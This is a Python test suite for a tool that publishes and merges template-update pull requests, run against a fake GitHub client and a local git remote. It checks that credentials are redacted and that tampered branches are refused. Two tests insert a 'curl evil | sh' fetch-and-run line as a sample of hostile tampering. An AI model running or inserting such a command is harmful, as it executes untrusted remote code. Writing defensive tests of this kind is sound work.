"""tools/mercury_update.py (#688): publish, merge and verify against a fake `gh` and a fake git remote.

The remote is a local bare repository (so `git push` and `git fetch` are real); `gh` is a Python object that answers the
calls the tool makes and records them. Mercury is a throw-away repository whose `origin/master` ref is set by hand. The real
tools/mercury.py runs for `apply` and `check`. Nothing here touches the network."""
import contextlib
import hashlib
import importlib.util
import io
import json
import os
import subprocess
import sys
import tempfile
import unittest
import unittest.mock
import urllib.parse
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
TOOL = ROOT / "tools" / "mercury_update.py"
REPO = "test/downstream"
BASE = "develop"
LOCK, CONFIG, V1_LOCK = ".mercury/lock.json", ".mercury/config.json", ".codex/mercury-template.lock"
DEV_ROLE = '---\ndescription: "Builds things."\nclaude:\n  model: sonnet\ncodex:\n  sandbox_mode: workspace-write\n---\n\n# Role: builder\n'
BOT = "mercury-update@users.noreply.github.com"
SECRET = "ghp_" + "A1b2C3d4" * 4


def load():
    spec = importlib.util.spec_from_file_location("mercury_update_tool", TOOL)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = mod
    spec.loader.exec_module(mod)
    return mod


U = load()


def write(path, data):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data if isinstance(data, bytes) else data.encode("utf-8"))


def git(repo, *args, check=True, email="dev@example.com"):
    r = subprocess.run(["git", "-C", str(repo), "-c", "user.name=dev", "-c", f"user.email={email}", *args],
                       capture_output=True, text=True, encoding="utf-8")
    if check:
        assert r.returncode == 0, r.stderr
    return r.stdout.strip()


def init(path, *flags):
    path.mkdir(parents=True, exist_ok=True)
    git(path, "init", "-q", *flags)
    git(path, "config", "core.autocrlf", "false")


class FakeGh:
    """The seam to GitHub. `prs` are open pull requests; heads are read live from the bare remote, as GitHub would."""

    def __init__(self, bare):
        self.bare, self.prs, self.calls = bare, [], []
        self.runs, self.statuses = {}, {}  # sha -> list
        self.total_override = {}
        self.next_number = 1
        self.fail_on = None

    def sha(self, ref):
        r = subprocess.run(["git", "-C", str(self.bare), "rev-parse", "--verify", "--quiet", f"refs/heads/{ref}"],
                           capture_output=True, text=True)
        return r.stdout.strip() if r.returncode == 0 else "0" * 40  # a pull request whose branch is not in the remote

    def add_pr(self, ref, repo=REPO, **extra):
        pr = {"number": self.next_number, "ref": ref, "repo": repo, "state": "open", "draft": False, "mergeable": True,
              "base": BASE, "title": "t", **extra}
        self.next_number += 1
        self.prs.append(pr)
        return pr

    def item(self, pr):
        return {"number": pr["number"], "state": pr["state"], "draft": pr["draft"], "mergeable": pr["mergeable"],
                "head": {"ref": pr["ref"], "sha": pr.get("sha") or self.sha(pr["ref"]),
                         "repo": None if pr["repo"] is None else {"full_name": pr["repo"]}},
                "base": {"ref": pr["base"]}}

    def set_checks(self, sha, checks):
        """checks: {name: (status, conclusion[, app slug])} as check runs; the app defaults to github-actions."""
        self.runs[sha] = [{"id": i, "name": n, "status": v[0], "conclusion": v[1], "app": {"slug": v[2] if len(v) > 2 else "github-actions"}}
                          for i, (n, v) in enumerate(checks.items(), 1)]

    def all_green(self, sha, names=("CI", "Mercury verify")):
        self.set_checks(sha, {n: ("completed", "success") for n in names})

    def api(self, path):
        base, _, query = path.partition("?")
        qs = urllib.parse.parse_qs(query)
        page, per = int(qs.get("page", ["1"])[0]), int(qs.get("per_page", ["100"])[0])
        window = slice((page - 1) * per, page * per)
        if base == f"repos/{REPO}/pulls":
            assert qs["state"] == ["open"] and qs["base"] == [BASE], qs
            return [self.item(p) for p in self.prs if p["state"] == "open"][window]
        if base.startswith(f"repos/{REPO}/pulls/"):
            number = int(base.rsplit("/", 1)[1])
            return self.item(next(p for p in self.prs if p["number"] == number))
        if base.startswith(f"repos/{REPO}/commits/") and base.endswith("/check-runs"):
            sha = base.split("/")[4]
            runs = self.runs.get(sha, [])
            return {"total_count": self.total_override.get(sha, len(runs)), "check_runs": runs[window]}
        if base.startswith(f"repos/{REPO}/commits/") and base.endswith("/statuses"):
            return self.statuses.get(base.split("/")[4], [])[window]
        raise AssertionError(f"unexpected gh api call: {path}")

    def __call__(self, args):
        self.calls.append(list(args))
        if self.fail_on and self.fail_on in args:
            raise U.Unsafe(f"command failed (exit 1): gh {' '.join(args[:3])}\nauthorization: token {SECRET}")
        if args[0] == "api":
            return json.dumps(self.api(args[1]))
        if args[:2] == ["pr", "create"]:
            opt = dict(zip(args[2::2], args[3::2]))
            pr = self.add_pr(opt["--head"], title=opt["--title"], body=Path(opt["--body-file"]).read_text(encoding="utf-8"))
            return f"https://github.com/{REPO}/pull/{pr['number']}\n"
        if args[:2] == ["pr", "edit"]:
            opt = dict(zip(args[3::2], args[4::2]))
            pr = next(p for p in self.prs if p["number"] == int(args[2]))
            pr["title"], pr["body"] = opt["--title"], Path(opt["--body-file"]).read_text(encoding="utf-8")
            return ""
        if args[:2] == ["pr", "merge"]:
            pr = next(p for p in self.prs if p["number"] == int(args[2]))
            pr["state"] = "merged"
            return ""
        raise AssertionError(f"unexpected gh call: {args}")

    def named(self, *prefix):
        return [c for c in self.calls if c[:len(prefix)] == list(prefix)]


class Fixture(unittest.TestCase):
    """Mercury at c1 installed into `target` on `develop`; Mercury master can then move on."""
    install_first = True

    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.tmp = Path(tmp.name)
        self.m, self.bare, self.target = self.tmp / "mercury", self.tmp / "remote.git", self.tmp / "target"
        init(self.m)
        git(self.m, "remote", "add", "origin", "https://github.com/test/mercury.git")
        write(self.m / "mercury.json", json.dumps({"schema_version": 1, "packs": {
            "core": {"enabled": True, "required": True}, "extra": {"enabled": True}}}))
        write(self.m / "packs/core/pack.json", json.dumps({"schema_version": 1, "name": "core", "skills": {}}))
        write(self.m / "packs/core/claude.md", "@AGENTS.md\n")
        write(self.m / "packs/core/roles/dev.md", DEV_ROLE)
        write(self.m / "packs/extra/pack.json", json.dumps({"schema_version": 1, "name": "extra", "skills": {}}))
        self.c1 = self.m_commit(1)
        self.release(self.c1)
        init(self.bare, "--bare", "-b", BASE)
        init(self.target, "-b", BASE)
        git(self.target, "remote", "add", "origin", str(self.bare))
        write(self.target / CONFIG, json.dumps({"schema_version": 1, "packs": ["core", "extra"], "params": {
            "integration_branch": BASE, "required_checks": ["CI"]}}))
        write(self.target / "AGENTS.md", "# Project rules\n")
        write(self.target / "src/app.py", "print('app')\n")
        if self.install_first:
            self.mercury_tool("install", self.c1)
        else:
            self.seed_v1()
        git(self.target, "add", "-A")
        git(self.target, "commit", "-q", "-m", "base")
        git(self.target, "push", "-q", "origin", BASE)
        self.gh = FakeGh(self.bare)

    # --- Mercury ---

    def m_commit(self, n):
        write(self.m / "packs/core/agents.md", f"## Core\n\nCore text, version {n}.\n")
        write(self.m / "packs/extra/note.txt", f"note {n}\n")
        if n == 1:
            write(self.m / "packs/extra/old.txt", "old\n")  # shipped by c1 only: every later release deletes it downstream
        elif (self.m / "packs/extra/old.txt").exists():
            (self.m / "packs/extra/old.txt").unlink()
        git(self.m, "add", "-A")
        git(self.m, "commit", "-q", "-m", f"change {n}")
        return git(self.m, "rev-parse", "HEAD")

    def release(self, sha):
        git(self.m, "update-ref", "refs/remotes/origin/master", sha)

    def mercury_tool(self, mode, commit):
        r = subprocess.run([sys.executable, "-B", str(ROOT / "tools/mercury.py"), mode, "--source", str(self.m), "--target",
                            str(self.target), "--source-commit", commit], capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)

    def seed_v1(self):
        files = {".codex/agents/mercury-dev.toml": "# v1 toml\n", ".codex/project/mercury-readme.md": "v1 doc\n"}
        for rel, text in files.items():
            write(self.target / rel, text)
        write(self.target / V1_LOCK, json.dumps({"schema_version": 1, "files": {
            rel[len(".codex/"):]: hashlib.sha256(text.encode()).hexdigest() for rel, text in files.items()}}))

    def advance_base(self, commit):
        """The project merged an update to `commit` earlier (so the base lock names it)."""
        git(self.target, "switch", "-q", BASE)
        self.mercury_tool("apply", commit)
        git(self.target, "add", "-A")
        git(self.target, "commit", "-q", "-m", f"base at {commit[:7]}")
        git(self.target, "push", "-q", "origin", BASE)

    def reset_target(self):
        """A fresh job: the checkout is clean at the tip of the base branch."""
        git(self.target, "switch", "-q", "-f", BASE)
        git(self.target, "reset", "-q", "--hard", f"origin/{BASE}")

    # --- running the tool ---

    def run_tool(self, command, *extra, gh=None):
        args = [command, "--target", str(self.target), "--mercury", str(self.m), "--base", BASE, *extra]
        if command != "verify":
            args += ["--repo", REPO]
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            rc = U.main(args, gh=gh or self.gh)
        return rc, out.getvalue(), err.getvalue()

    def publish(self):
        return self.run_tool("publish")

    def merge(self, *extra):
        return self.run_tool("merge", *extra)

    def edit_branch(self, branch, edits, email="dev@example.com"):
        """Commit `edits` {path: text | callable(bytes) -> bytes | None to delete} on a branch of the remote, as someone else."""
        work = self.tmp / f"work-{len(list(self.tmp.glob('work-*')))}"
        git(self.tmp, "clone", "-q", "--branch", branch, str(self.bare), str(work))
        for rel, change in edits.items():
            p = work / rel
            if change is None:
                p.unlink()
            elif callable(change):
                write(p, change(p.read_bytes() if p.exists() else b""))
            else:
                write(p, change)
        git(work, "add", "-A", email=email)
        git(work, "commit", "-q", "-m", "edit", email=email)
        git(work, "push", "-q", "origin", f"HEAD:refs/heads/{branch}")
        return git(work, "rev-parse", "HEAD")

    def symlink_on_branch(self, branch, rel, target="elsewhere"):
        work = self.tmp / f"work-{len(list(self.tmp.glob('work-*')))}"
        git(self.tmp, "clone", "-q", "--branch", branch, str(self.bare), str(work))
        blob = subprocess.run(["git", "-C", str(work), "hash-object", "-w", "--stdin"], input=target, capture_output=True,
                              text=True, check=True).stdout.strip()
        git(work, "update-index", "--add", "--cacheinfo", f"120000,{blob},{rel}")
        git(work, "commit", "-q", "-m", "symlink")
        git(work, "push", "-q", "origin", f"HEAD:refs/heads/{branch}")
        return git(work, "rev-parse", "HEAD")

    def published(self, commit=None):
        """Move Mercury to a new released commit, publish it, and return (branch, head sha, pr)."""
        new = commit or self.m_commit(2)
        self.release(new)
        rc, out, err = self.publish()
        self.assertEqual(rc, 0, out + err)
        pr = self.gh.prs[-1]
        self.reset_target()
        return pr["ref"], self.gh.sha(pr["ref"]), pr

    def remote_branches(self):
        return git(self.bare, "for-each-ref", "--format=%(refname:short)", "refs/heads/").split()


def new_lock_commit(text):
    return json.loads(text)["source_commit"]


class Diagnostics(unittest.TestCase):
    def test_redact_strips_tokens_userinfo_and_auth_headers(self):
        for text in (f"x {SECRET} y", "github_pat_" + "A" * 30, "https://user:pw@github.com/a/b.git", "Authorization: Bearer abc123",
                     "authorization: token abc"):
            with self.subTest(text=text):
                out = U.redact(text, 600)
                self.assertIn("<redacted>", out)
                for leaked in (SECRET, "A" * 30, "user:pw", "abc123", "abc"):
                    self.assertNotIn(leaked, out)

    def test_describe_cuts_arguments_only_after_redacting_them(self):
        shown = U.describe(["gh", "api", "x" * 70 + SECRET])
        self.assertNotIn(SECRET[:12], shown)
        self.assertNotIn("x-access-token", U.describe(["git", "push", "https://x-access-token:abc@github.com/a/b"]))

    def test_a_failing_command_reports_without_the_secret(self):
        code = f"import sys; sys.stderr.write('Authorization: token {SECRET}'); sys.exit(3)"
        with self.assertRaises(U.Unsafe) as cm:
            U.run([sys.executable, "-c", code])
        self.assertIn("exit 3", str(cm.exception))
        self.assertNotIn(SECRET, str(cm.exception))

    def test_an_unstartable_command_is_reported_by_type_only(self):
        with self.assertRaises(U.Unsafe) as cm:
            U.run(["definitely-not-a-command-xyz", SECRET])
        self.assertNotIn(SECRET, str(cm.exception))

    def test_main_never_prints_a_credential_from_gh(self):
        class Boom:
            def __call__(self, args):
                raise U.Unsafe(f"command failed: {U.redact('authorization: token ' + SECRET, 300)}")
        err = io.StringIO()
        with contextlib.redirect_stderr(err), contextlib.redirect_stdout(io.StringIO()):
            tmp = tempfile.TemporaryDirectory()
            self.addCleanup(tmp.cleanup)
            init(Path(tmp.name))
            rc = U.main(["merge", "--target", tmp.name, "--mercury", tmp.name, "--base", "main", "--repo", REPO], gh=Boom())
        self.assertEqual(rc, 2)
        self.assertNotIn(SECRET, err.getvalue())


class Pagination(unittest.TestCase):
    def setUp(self):
        self.saved = U.PER_PAGE, U.MAX_PAGES
        self.addCleanup(lambda: (setattr(U, "PER_PAGE", self.saved[0]), setattr(U, "MAX_PAGES", self.saved[1])))

    @staticmethod
    def lister(items, total=None, key=None):
        def gh(args):
            q = urllib.parse.parse_qs(args[1].partition("?")[2])
            page, per = int(q["page"][0]), int(q["per_page"][0])
            chunk = items[(page - 1) * per:page * per]
            return json.dumps({"total_count": len(items) if total is None else total, key: chunk} if key else chunk)
        return gh

    def test_every_page_is_read(self):
        U.PER_PAGE = 2
        self.assertEqual(U.paged(self.lister(list(range(5))), "x"), [0, 1, 2, 3, 4])
        self.assertEqual(U.paged(self.lister(list(range(5)), key="k"), "x?a=1", key="k"), [0, 1, 2, 3, 4])

    def test_running_out_of_pages_is_a_refusal(self):
        U.PER_PAGE, U.MAX_PAGES = 2, 2
        with self.assertRaises(U.Unsafe) as cm:
            U.paged(self.lister(list(range(5))), "x")
        self.assertIn("more than", str(cm.exception))
        with self.assertRaises(U.Unsafe):
            U.paged(self.lister(list(range(5)), key="k"), "x", key="k")

    def test_a_count_that_does_not_match_is_a_refusal(self):
        U.PER_PAGE = 2
        with self.assertRaises(U.Unsafe) as cm:
            U.paged(self.lister(list(range(3)), total=9, key="k"), "x", key="k")
        self.assertIn("read 3 of 9", str(cm.exception))

    def test_odd_answers_are_a_refusal(self):
        for answer in ('{"a": 1}', '"x"', "[1]"):
            with self.subTest(answer=answer), self.assertRaises(U.Unsafe):
                U.paged(lambda args, a=answer: a, "x", key="k")
        with self.assertRaises(U.Unsafe):
            U.paged(lambda args: '{"k": []}', "x", key="k")  # no total_count


class ManagedSection(unittest.TestCase):
    """entry_problem: only the bytes between the markers may change."""
    BEGIN = "<!-- MERCURY:BEGIN managed by tools/mercury.py -->"
    END = "<!-- MERCURY:END -->"

    def block(self, body, eol="\n"):
        return eol.join([self.BEGIN, body, self.END])

    def check(self, old, new, body="new"):
        h = U.inst.digest(self.block(body).encode())
        return U.entry_problem("AGENTS.md", None if old is None else old.encode(), None if new is None else new.encode(), {"AGENTS.md": h})

    def test_the_allowed_shapes(self):
        b = self.block("new")
        self.assertIsNone(self.check(None, b + "\n"))  # created
        self.assertIsNone(self.check("", b + "\n"))  # empty file
        self.assertIsNone(self.check("# mine\n", b + "\n\n# mine\n"))  # inserted at the top
        self.assertIsNone(self.check("# mine\r\n", self.block("new", "\r\n") + "\r\n\r\n# mine\r\n"))  # CRLF file
        self.assertIsNone(self.check("top\n" + self.block("old") + "\nbottom\n", "top\n" + b + "\nbottom\n"))  # updated in place

    def test_changes_outside_the_markers_are_refused(self):
        b = self.block("new")
        old = "top\n" + self.block("old") + "\nbottom\n"
        for new in ("TOP\n" + b + "\nbottom\n", "top\n" + b + "\nbottom!\n", "top\n" + b + "\n", b + "\nbottom\n"):
            with self.subTest(new=new):
                self.assertIn("outside the Mercury section", self.check(old, new))
        self.assertIn("outside", self.check("# mine\n", b + "\n\n# mine!\n"))
        self.assertIn("outside", self.check("# mine\n", "x\n" + b + "\n\n# mine\n"))
        self.assertIn("outside", self.check("# mine\n", b + "\n# mine\n"))  # the separator line is part of the contract

    def test_other_refusals(self):
        b = self.block("new")
        self.assertIn("deleted", self.check("x\n", None))
        self.assertIn("no Mercury section", self.check("x\n", "x\n"))
        self.assertIn("not the one recorded in the lock", self.check("# m\n", self.block("different") + "\n\n# m\n"))
        self.assertIn("markers", self.check("# m\n", b + "\n" + b + "\n\n# m\n"))
        self.assertIn("UTF-8", U.entry_problem("AGENTS.md", b"x", b"\xff\xfe", {}))


class Publish(Fixture):
    def test_publishes_a_branch_and_one_pull_request_for_the_released_commit(self):
        c2 = self.m_commit(2)
        self.release(c2)
        out_file = self.tmp / "gh_output.txt"
        with unittest.mock.patch.dict(os.environ, {"GITHUB_OUTPUT": str(out_file)}):
            rc, out, err = self.publish()
        self.assertEqual(rc, 0, out + err)
        branch = f"mercury/update-{c2[:12]}"
        self.assertIn(branch, self.remote_branches())
        self.assertEqual(git(self.bare, "rev-parse", BASE), git(self.target, "rev-parse", f"origin/{BASE}"))  # base untouched
        create = self.gh.named("pr", "create")
        self.assertEqual(len(create), 1)
        opt = dict(zip(create[0][2::2], create[0][3::2]))
        self.assertEqual((opt["--repo"], opt["--base"], opt["--head"]), (REPO, BASE, branch))
        self.assertIn(c2[:12], opt["--title"])
        pr = self.gh.prs[0]
        for needle in (f"https://github.com/test/mercury/commit/{c2}", "Upstream changes since " + self.c1[:12], "change 2",
                       "`packs/", "`.mercury/lock.json`", "Do not push to this branch"):
            self.assertIn(needle.replace("`packs/", "`.mercury/packs/"), pr["body"], needle)
        self.assertEqual(out_file.read_text(), "published=true\n")
        # The commit is the tool's, carries the lock of c2, and the base..head diff is managed paths only.
        self.assertEqual(git(self.bare, "log", "-1", "--format=%ce", branch), BOT)
        lock = git(self.bare, "show", f"{branch}:{LOCK}")
        self.assertEqual(new_lock_commit(lock), c2)
        changed = git(self.bare, "diff", "--name-only", BASE, branch).split()
        self.assertNotIn("src/app.py", changed)
        self.assertNotIn(CONFIG, changed)
        self.assertIn("AGENTS.md", changed)

    def test_the_unreleased_tip_of_mercury_is_never_published(self):
        c2 = self.m_commit(2)
        self.release(c2)
        self.m_commit(3)  # on the Mercury checkout's HEAD, not on origin/master
        self.assertEqual(self.publish()[0], 0)
        self.assertEqual(new_lock_commit(git(self.bare, "show", f"mercury/update-{c2[:12]}:{LOCK}")), c2)

    def test_nothing_to_do_when_the_project_already_matches(self):
        rc, out, err = self.publish()
        self.assertEqual(rc, 0, out + err)
        self.assertIn("nothing to do", out)
        self.assertEqual(self.gh.named("pr", "create"), [])
        self.assertEqual(self.remote_branches(), [BASE])

    def test_an_open_pull_request_for_the_same_commit_is_left_alone(self):
        branch, head, pr = self.published()
        rc, out, err = self.publish()
        self.assertEqual(rc, 0, out + err)
        self.assertIn("already carries", out)
        self.assertEqual((self.gh.sha(branch), len(self.gh.named("pr", "create")), self.gh.named("pr", "edit")), (head, 1, []))

    def test_an_older_update_pull_request_gets_a_regular_push_on_top(self):
        branch, head, pr = self.published()
        c3 = self.m_commit(3)
        self.release(c3)
        rc, out, err = self.publish()
        self.assertEqual(rc, 0, out + err)
        new_head = self.gh.sha(branch)
        self.assertNotEqual(new_head, head)
        self.assertEqual(git(self.bare, "merge-base", "--is-ancestor", head, new_head, check=False), "")  # a fast-forward
        self.assertEqual(subprocess.run(["git", "-C", str(self.bare), "merge-base", "--is-ancestor", head, new_head]).returncode, 0)
        self.assertEqual(len(self.gh.named("pr", "create")), 1)  # still one pull request
        self.assertEqual(len(self.gh.named("pr", "edit")), 1)
        self.assertIn(c3[:12], pr["title"])
        self.assertEqual(new_lock_commit(git(self.bare, "show", f"{branch}:{LOCK}")), c3)
        self.assertEqual(self.remote_branches(), [BASE, branch])  # no second branch
        self.assertEqual(git(self.bare, "log", "--format=%ce", f"{BASE}..{branch}").split(), [BOT, BOT])

    def test_the_tool_has_no_force_push_anywhere(self):
        text = TOOL.read_text(encoding="utf-8")
        pushes = [l for l in text.splitlines() if '"push"' in l]
        self.assertEqual(len(pushes), 1, pushes)
        self.assertNotIn("force", pushes[0])
        self.assertNotIn('"+', pushes[0])
        self.assertNotIn("--force-with-lease", text)
        self.assertEqual([l.strip() for l in text.splitlines() if "--force" in l], ['git(target, "worktree", "remove", "--force", str(tree))'])

    def test_a_branch_with_someone_elses_commit_is_never_built_on(self):
        branch, head, pr = self.published()
        theirs = self.edit_branch(branch, {"notes.txt": "mine\n"})
        c3 = self.m_commit(3)
        self.release(c3)
        self.reset_target()
        rc, out, err = self.publish()
        self.assertEqual(rc, 1, out + err)
        self.assertIn("did not make", err)
        self.assertEqual(self.gh.sha(branch), theirs)  # untouched
        self.assertEqual(self.gh.named("pr", "edit"), [])

    def test_a_remote_branch_without_an_open_pull_request_is_never_overwritten(self):
        c2 = self.m_commit(2)
        self.release(c2)
        git(self.target, "push", "-q", "origin", f"HEAD:refs/heads/mercury/update-{c2[:12]}")
        before = git(self.bare, "rev-parse", f"mercury/update-{c2[:12]}")
        rc, out, err = self.publish()
        self.assertEqual(rc, 1, out + err)
        self.assertIn("without an open pull request", err)
        self.assertEqual(git(self.bare, "rev-parse", f"mercury/update-{c2[:12]}"), before)

    def test_a_pull_request_that_is_ahead_of_master_is_not_touched(self):
        c2, c3 = self.m_commit(2), self.m_commit(3)
        self.release(c3)
        branch, head, pr = self.published(c3)
        self.release(c2)  # master was rewound (or the pull request came from somewhere else)
        rc, out, err = self.publish()
        self.assertEqual(rc, 1, out + err)
        self.assertIn("not an ancestor", err)
        self.assertEqual(self.gh.sha(branch), head)

    def test_a_dirty_or_stale_checkout_stops_before_anything_happens(self):
        self.release(self.m_commit(2))
        write(self.target / "stray.txt", "x")
        rc, out, err = self.publish()
        self.assertEqual((rc, "clean" in err), (1, True))
        (self.target / "stray.txt").unlink()
        write(self.target / "other.txt", "y")
        git(self.target, "add", "other.txt")
        git(self.target, "commit", "-q", "-m", "local only")
        rc, out, err = self.publish()
        self.assertEqual((rc, "tip of origin" in err), (1, True))
        self.assertEqual(self.remote_branches(), [BASE])
        self.assertEqual(self.gh.named("pr", "create"), [])

    def test_a_hand_edited_managed_file_stops_the_apply_and_pushes_nothing(self):
        self.release(self.m_commit(2))
        write(self.target / ".mercury/packs/extra/note.txt", "edited by hand\n")
        git(self.target, "add", "-A")
        git(self.target, "commit", "-q", "-m", "hand edit")
        git(self.target, "push", "-q", "origin", BASE)
        rc, out, err = self.publish()
        self.assertEqual(rc, 1, out + err)
        self.assertIn("modified by hand", err)
        self.assertEqual(self.remote_branches(), [BASE])

    def test_a_cross_repository_branch_or_a_second_update_pull_request_stops_publishing(self):
        self.release(self.m_commit(2))
        self.gh.add_pr("mercury/update-aaaaaaaaaaaa", repo="evil/fork")
        rc, out, err = self.publish()
        self.assertEqual((rc, "another repository" in err), (2, True))
        self.assertEqual(self.remote_branches(), [BASE])

    def test_publish_refuses_a_failure_of_gh_without_leaking_it(self):
        self.release(self.m_commit(2))
        self.gh.fail_on = "create"
        rc, out, err = self.publish()
        self.assertEqual(rc, 2)
        self.assertNotIn(SECRET, out + err)


class PublishV1(Fixture):
    install_first = False

    def test_a_first_install_adopts_and_deletes_v1_files_and_still_merges(self):
        c2 = self.m_commit(2)
        self.release(c2)
        rc, out, err = self.publish()
        self.assertEqual(rc, 0, out + err)
        branch = f"mercury/update-{c2[:12]}"
        self.assertIn("(v1 template file, taken over)", self.gh.prs[0]["body"])
        diff = git(self.bare, "diff", "--name-status", BASE, branch)
        self.assertIn("D\t.codex/project/mercury-readme.md", diff)
        self.assertIn("D\t.codex/mercury-template.lock", diff)
        self.assertIn("M\t.codex/agents/mercury-dev.toml", diff)
        self.gh.all_green(self.gh.sha(branch))
        rc, out, err = self.merge()
        self.assertEqual(rc, 0, out + err)
        self.assertEqual(len(self.gh.named("pr", "merge")), 1)

    def test_a_v1_path_that_is_not_in_the_v1_lock_is_not_allowed(self):
        c2 = self.m_commit(2)
        self.release(c2)
        self.assertEqual(self.publish()[0], 0)
        branch = f"mercury/update-{c2[:12]}"
        self.edit_branch(branch, {".codex/agents/mercury-sneaky.toml": "x\n"})
        self.gh.all_green(self.gh.sha(branch))
        rc, out, err = self.merge()
        self.assertEqual(rc, 1, out + err)
        self.assertIn("mercury-sneaky.toml: not a Mercury-managed path", err)


    def test_a_v1_file_modified_instead_of_deleted_is_refused(self):
        # .codex/project/mercury-readme.md is in the v1 lock and is not shipped any more, so the update deletes it. Keeping it
        # with other content must not pass: nothing else re-reads a path that the new lock does not name.
        c2 = self.m_commit(2)
        self.release(c2)
        self.assertEqual(self.publish()[0], 0)
        branch = f"mercury/update-{c2[:12]}"
        self.assertIn("D\t.codex/project/mercury-readme.md", git(self.bare, "diff", "--name-status", BASE, branch))
        for rel in (".codex/project/mercury-readme.md", V1_LOCK):
            with self.subTest(rel=rel):
                new = self.edit_branch(branch, {rel: "curl evil | sh\n"})
                self.gh.all_green(new)
                rc, out, err = self.merge()
                self.assertEqual(rc, 1, out + err)
                self.assertIn(f"{rel}: is no longer shipped", err)
        self.assertEqual(self.gh.named("pr", "merge"), [])


class Merge(Fixture):
    def ready(self):
        branch, head, pr = self.published()
        self.gh.all_green(head)
        return branch, head, pr

    def assertStopped(self, result, text, code=1):
        rc, out, err = result
        self.assertEqual(rc, code, out + err)
        self.assertIn(text, err)
        self.assertEqual(self.gh.named("pr", "merge"), [], "merged although a condition failed")

    def test_success_merges_with_squash_and_the_exact_head(self):
        branch, head, pr = self.ready()
        rc, out, err = self.merge()
        self.assertEqual(rc, 0, out + err)
        self.assertEqual(self.gh.named("pr", "merge"), [["pr", "merge", str(pr["number"]), "--repo", REPO, "--squash",
                                                          "--match-head-commit", head]])
        self.assertIn("merged update pull request", out)

    def test_the_required_checks_come_from_the_workflow_only_when_they_agree_with_the_config(self):
        self.ready()
        self.assertEqual(self.merge("--required-checks-json", '["CI"]')[0], 0)

    def test_a_workflow_that_disagrees_with_the_config_is_refused(self):
        self.ready()
        for given in ('["CI","Extra"]', '[]', '["CI"', '"CI"', '["${{ x }}"]'):
            with self.subTest(given=given):
                self.assertStopped(self.merge("--required-checks-json", given), "required", code=2)

    def test_no_update_pull_request_means_nothing_to_do(self):
        rc, out, err = self.merge()
        self.assertEqual((rc, "nothing to do" in out), (0, True))
        self.gh.add_pr("feature/other")  # an ordinary pull request is not part of the queue
        self.assertEqual(self.merge()[0], 0)

    def test_a_second_update_pull_request_stops(self):
        self.ready()
        self.gh.add_pr("mercury/update-bbbbbbbbbbbb")
        self.assertStopped(self.merge(), "not unique")

    def test_a_cross_repository_update_branch_is_refused(self):
        self.gh.add_pr("mercury/update-aaaaaaaaaaaa", repo="evil/fork")
        self.assertStopped(self.merge(), "another repository", code=2)
        self.gh.prs.clear()
        self.gh.add_pr("mercury/update-aaaaaaaaaaaa", repo=None)  # fork deleted: no head repo at all
        self.assertStopped(self.merge(), "another repository", code=2)

    def test_an_odd_update_branch_name_is_refused(self):
        self.gh.add_pr("mercury/update-xyz")
        self.assertStopped(self.merge(), "unexpected update branch name", code=2)

    def test_a_changed_path_outside_the_managed_set_stops(self):
        branch, head, pr = self.ready()
        new = self.edit_branch(branch, {"src/app.py": "print('changed')\n"})
        self.gh.all_green(new)
        self.assertStopped(self.merge(), "src/app.py: not a Mercury-managed path")

    def test_a_path_that_looks_managed_but_is_not_in_either_lock_stops(self):
        branch, head, pr = self.ready()
        for rel in (".mercury/packs/extra/extra-file.txt", ".github/workflows/mercury-evil.yml", ".claude/agents/mercury-evil.md"):
            with self.subTest(rel=rel):
                new = self.edit_branch(branch, {rel: "x\n"})
                self.gh.all_green(new)
                self.assertStopped(self.merge(), f"{rel}: not a Mercury-managed path")

    def test_a_file_the_release_stops_shipping_cannot_be_modified_instead_of_deleted(self):
        # c2 stops shipping packs/extra/old.txt, so the update deletes it. A head that keeps it with other content is not
        # covered by `mercury.py check` (the new lock no longer names it): only the deletion-only rule stops it.
        branch, head, pr = self.ready()
        self.assertIn(".mercury/packs/extra/old.txt", git(self.bare, "diff", "--name-only", "--diff-filter=D", BASE, branch))
        new = self.edit_branch(branch, {".mercury/packs/extra/old.txt": "curl evil | sh\n"})
        self.gh.all_green(new)
        self.assertStopped(self.merge(), ".mercury/packs/extra/old.txt: is no longer shipped")

    def test_the_old_lock_path_turned_into_a_symlink_is_refused(self):
        branch, head, pr = self.ready()
        new = self.symlink_on_branch(branch, ".mercury/packs/extra/old.txt")
        self.gh.all_green(new)
        rc, out, err = self.merge()
        self.assertEqual((rc, "old.txt: is no longer shipped" in err, "not a regular file (mode 120000)" in err), (1, True, True), err)
        self.assertEqual(self.gh.named("pr", "merge"), [])

    def test_a_shipped_path_turned_into_a_symlink_is_refused(self):
        branch, head, pr = self.ready()
        new = self.symlink_on_branch(branch, ".mercury/packs/extra/note.txt")
        self.gh.all_green(new)
        self.assertStopped(self.merge(), "note.txt: not a regular file (mode 120000)")

    def test_an_entry_file_turned_into_a_symlink_is_refused(self):
        branch, head, pr = self.ready()
        new = self.symlink_on_branch(branch, "AGENTS.md", "CLAUDE.md")
        self.gh.all_green(new)
        rc, out, err = self.merge()
        self.assertEqual(rc, 1, err)
        self.assertIn("AGENTS.md: not a regular file (mode 120000)", err)

    def test_the_lock_deleted_or_replaced_by_a_symlink_is_refused(self):
        branch, head, pr = self.ready()
        new = self.symlink_on_branch(branch, ".mercury/lock.json")
        self.gh.all_green(new)
        self.assertStopped(self.merge(), "lock")

    def test_the_project_config_never_changes_in_an_update(self):
        branch, head, pr = self.ready()
        new = self.edit_branch(branch, {CONFIG: lambda b: b + b" "})
        self.gh.all_green(new)
        self.assertStopped(self.merge(), ".mercury/config.json must not change")

    def test_a_change_outside_the_managed_section_of_agents_md_stops(self):
        branch, head, pr = self.ready()
        new = self.edit_branch(branch, {"AGENTS.md": lambda b: b + b"sneaked in\n"})
        self.gh.all_green(new)
        self.assertStopped(self.merge(), "AGENTS.md: bytes outside the Mercury section changed")

    def test_a_deleted_entry_file_stops(self):
        branch, head, pr = self.ready()
        new = self.edit_branch(branch, {"CLAUDE.md": None})
        self.gh.all_green(new)
        self.assertStopped(self.merge(), "CLAUDE.md: deleted")

    def test_a_managed_file_with_other_content_than_mercury_produces_stops(self):
        # The path is in the lock, so the path rule alone would let it through; the check on the head catches the content.
        branch, head, pr = self.ready()
